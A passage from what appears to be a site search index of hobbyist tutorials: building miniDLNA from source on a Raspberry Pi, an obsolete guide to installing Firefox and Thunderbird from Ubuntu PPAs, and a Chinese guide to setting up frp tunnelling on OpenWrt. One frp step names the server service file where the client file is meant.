minidlna sudo apt-get autoremove -y Make sure you have a source repository, default Raspbian does not include this, change wheezy to jessie if you know you are on jessie echo \"deb-src http://archive.raspbian.org/raspbian wheezy main contrib non-free\" | sudo tee -a /etc/apt/sources.list Update repositories so it will detect your new source repo sudo apt-get update Grab dependencies for building it from source sudo apt-get build-dep minidlna -y If you get any errors you can install the dependencies manually sudo apt-get install autopoint debhelper dh-autoreconf gcc libavutil-dev libavcodec-dev libavformat-dev libjpeg-dev libsqlite3-dev libexif-dev libid3tag0-dev libogg-dev libvorbis-dev libflac-dev -y Download the latest miniDLNA source wget http://sourceforge.net/projects/minidlna/files/latest/download?source=files -O minidlna.tar.gz SourceForge has some stability issues so here is a Dropbox mirror for 1.1.4 in case it is down wget https://www.dropbox.com/s/hhv7ee057plec7a/minidlna-1.1.4.tar.gz Unpack miniDLNA tar -xvf minidlna*.tar.gz Enter the miniDLNA directory cd minidlna* Configure, make and install miniDLNA, it will take 5 minutes. ./configure && sudo make && sudo make install Copy the default configuration file sudo cp minidlna.conf /etc/ Copy the startup daemon script to autostart ReadyMedia miniDLNA on boot sudo cp linux/minidlna.init.d.script /etc/init.d/minidlna Make the startup script executable sudo chmod +x /etc/init.d/minidlna Update rc to use the miniDLNA defaults sudo update-rc.d minidlna defaults Edit the configuration sudo nano /etc/minidlna.conf Edit the settings below to point to your media folders. This version of minidlna will give you multiple folders under Video. Before movies and TV would have been under separate categories, now movies and TV will both be under the category video. It will also show the folder structure of them instead of showing just the video files. Avi files will also show up and be streamable. inotify uses resources because it autoupdates your library, if you don't use inotify you will have to manually restart and reload the miniDLNA service The friendly name is how your miniDLNA server will show up to its streaming clients media_dir=V,/mnt/usbstorage/Movies media_dir=V,/mnt/usbstorage/TV media_dir=A,/mnt/usbstorage/Music media_dir=P,/mnt/usbstorage/Pictures # Names the DLNA server friendly_name=RasPi Media Server # Tells the DLNA to update the library when there are changes inotify=yes Ctrl+X, Y and Enter to save and exit Start the minidlna service sudo service minidlna start Now make sure miniDLNA starts on boot It will run on port 8200 so you can check how many media files it has indexed there sudo reboot Your Raspberry Pi DLNA server will now be accessible to stream media to your clients: PCs, XBOX, PS3, Phones, TVs and more. This will form part of my Ultimate Raspberry Pi Media Server guide, to make sure you don't miss it sign up for my mailing list to find out when it drops.","title":"Install Latest ReadyMedia miniDLNA Raspberry Pi"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/","text":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/#latest-version-of-firefox-and-thunderbird-on-a-raspberry-pi-obsolete","text":"This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/","text":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba \u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002 \u51c6\u5907\u5de5\u4f5c \u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 5M \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* \u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#openwrt-frp","text":"\u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f 